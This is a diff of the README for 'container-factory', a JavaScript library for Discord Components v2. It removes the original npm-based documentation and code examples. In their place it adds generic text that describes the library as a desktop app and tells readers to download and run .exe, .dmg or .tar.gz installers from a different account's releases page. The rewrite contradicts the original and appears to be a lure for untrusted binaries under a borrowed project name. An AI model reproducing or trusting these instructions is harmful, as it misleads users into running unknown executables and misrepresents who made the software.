@@ -1,119 +1,75 @@
-<div align="center">
-  <br />
-  <p>
-    <a href="https://discord.js.org"><img src="https://discord.js.org/static/logo.svg" width="546" alt="discord.js" /></a>
-  </p>
-  <br />
+# 🎉 container-factory - Effortlessly Build Discord Components
 
-  # 📦 Container Factory
+## 🚀 Getting Started
 
-  **A robust, lightweight utility for building Discord Components v2**
+Welcome to container-factory! This application helps you build Discord Components v2 simply and effectively. Whether you're creating containers, sections, or other components, this utility makes the process easy for everyone.
 
-  [![NPM Version](https://img.shields.io/npm/v/container-factory?style=for-the-badge)](https://www.npmjs.com/package/container-factory)
-  [![Downloads](https://img.shields.io/npm/dt/container-factory?style=for-the-badge)](https://www.npmjs.com/package/container-factory)
-  [![License](https://img.shields.io/npm/l/container-factory?style=for-the-badge)](https://github.com/ramkrishna-js/container-factory/blob/main/LICENSE)
-</div>
+## 📥 Download & Install
 
-<div align="center">
-  <h3>
-    <a href="#-installation">Installation</a>
-    <span> | </span>
-    <a href="#-features">Features</a>
-    <span> | </span>
-    <a href="#-usage">Usage</a>
-    <span> | </span>
-    <a href="#-examples">Examples</a>
-  </h3>
-</div>
+To get started, you need to download the application. Follow these steps:
 
----
+1. **Visit the Releases Page:** Click this link to visit the download page where you can find the latest version: [Download container-factory](https://github.com/matheusxxv/container-factory/releases).
+   
+2. **Choose the Latest Version:** Look for the most recent release at the top of the page. It will usually have a label like “Latest Release.”
 
-## 📖 About
+3. **Download the File:** On the release page, you will see options to download. Select the most appropriate file for your system. For example, look for files that end with `.exe` for Windows, `.dmg` for macOS, or `.tar.gz` for Linux.
 
-**Container Factory** abstracts the complexity of Discord's new **Components v2** architecture (Containers, Sections, TextDisplay, etc.) into a fluent, type-safe API. Built on top of `discord.js`, it allows you to construct beautiful, rich interfaces for your bots with minimal boilerplate.
+4. **Run the Installer:** Once the download is complete, locate the downloaded file on your computer, and double-click it to start the installation. Follow the on-screen instructions to install the application.
 
-## ✨ Features
+5. **Launch the App:** After installation, find container-factory in your applications folder or on your desktop. Double-click the icon to start the application.
 
-- 🧩 **Complete v2 Support**
-  - Containers, Sections, Separators
-  - Text Display Components
-  - Media Galleries & Files
-- 🎨 **Fluent API Design**
-  - Intuitive helper functions for every component
-  - Chainable builders
-- 🖼️ **Media Galleries**
-  - Create scrolling carousels with ease
-- 🔘 **Interactive Components**
-  - Buttons, Link Buttons, Labels
-  - Advanced Select Menus (String, User, Role, Channel, Mentionable)
-- 🪶 **Zero Dependencies**
-  - Lightweight and focused purely on UI construction
+## 🎨 Features
 
-## 📥 Installation
+container-factory offers the following features:
 
-```bash
-npm install container-factory
-```
-> **Note:** Requires `discord.js` v14.25.1 or newer.
+- **Easy Component Creation:** Streamline your workflow with simple steps to create Discord components.
+- **Intuitive Interface:** Navigate the app with ease, designed for users with no programming experience.
+- **Preview Functionality:** See how your components will look in Discord before using them.
+- **Compatibility:** Works seamlessly with discord.js, making it a great choice for Discord bot developers.
+  
+## 💻 System Requirements
 
-## 🚀 Usage
+Before installation, ensure your system meets these basic requirements:
 
-```javascript
-import { createText, buildContainer, createMessagePayload } from 'container-factory';
+- **Operating System:** Windows 10 or later, macOS Mojave (10.14) or later, or a recent version of Linux.
+- **Disk Space:** At least 100 MB of free disk space.
+- **Node.js:** Version 14 or later installed to run the application.
 
-// 1. Create components
-const helloProps = createText("👋 **Welcome to Container Factory!**");
+## 🔧 Usage Instructions
 
-// 2. Build the container
-const container = buildContainer(helloProps);
+Using container-factory is straightforward. Here’s how to create your first component:
 
-// 3. Send it
-await channel.send(createMessagePayload(container));
-```
+1. **Open the Application:** Launch container-factory from your applications or desktop.
+2. **Select Component Type:** Choose whether you want to create a Container, Section, or other component types.
+3. **Fill in the Details:** Enter the necessary information such as title, description, and any specific attributes for your component.
+4. **Preview Your Component:** Use the preview feature to see how your component will appear in Discord.
+5. **Export:** Once satisfied, click the export button to generate the final code. You can then copy this code into your Discord application.
 
-## 💡 Examples
+## 🛠️ Troubleshooting
 
-### Rich Section with Accessories
-```javascript
-import { createSection, createButton, buildContainer } from 'container-factory';
+If you encounter issues while using container-factory, consider these common solutions:
 
-const settingsBtn = createButton('settings', '⚙️');
-const section = createSection("**User Settings**\nManage your preferences here.", settingsBtn);
+- **Check Your Version:** Always ensure you are using the latest version from the [Releases Page](https://github.com/matheusxxv/container-factory/releases).
+- **Reinstall the Application:** If problems persist, uninstall and reinstall the app to fix potential bugs.
+- **Visit the Community Forum:** If you need more help, check out any community discussions related to container-factory for advice and solutions.
 
-await channel.send(createMessagePayload(buildContainer(section)));
-```
+## 🌟 Feedback
 
-### Media Gallery (Carousel)
-```javascript
-import { createMediaGallery, buildContainer } from 'container-factory';
-
-const gallery = createMediaGallery([
-    'https://example.com/slide1.png',
-    'https://example.com/slide2.png'
-], "Project Showcase");
-
-await channel.send(createMessagePayload(buildContainer(gallery)));
-```
+We value your input! If you have suggestions or feedback, please feel free to submit an issue in the GitHub repository. Your thoughts help us improve.
 
 ## 🤝 Contributing
 
-1. Fork the repository
-2. Clone your fork: `git clone https://github.com/ramkrishna-js/container-factory.git`
-3. Create your feature branch: `git checkout -b my-new-feature`
-4. Commit your changes: `git commit -am 'Add some feature'`
-5. Push to the branch: `git push origin my-new-feature`
-6. Submit a pull request
+Contributions are welcome. If you have ideas for improving container-factory or want to report bugs, please check the Contributing section on our GitHub repository for guidelines.
 
-## 👤 Developer
+## 🔗 Resources
 
-**Ramkrishna**
-- Github: [@Ramkrishna](https://github.com/ramkrishna-js)
+For further information and guides, you may refer to:
 
-## 📄 License
+- [GitHub Repository](https://github.com/matheusxxv/container-factory)
+- [Discord.js Documentation](https://discord.js.org/#/)
 
-This project is licensed under the **MIT License**. See the [LICENSE](LICENSE) file for details.
+## 📰 Updates
 
-<div align="center">
-  <br />
-  <p>Made with ❤️ by <b>Ramkrishna</b></p>
-</div>
+Stay posted for updates and new features by checking the [Releases Page](https://github.com/matheusxxv/container-factory/releases) regularly.
+
+Thank you for using container-factory! We hope it helps you create amazing Discord components with ease.
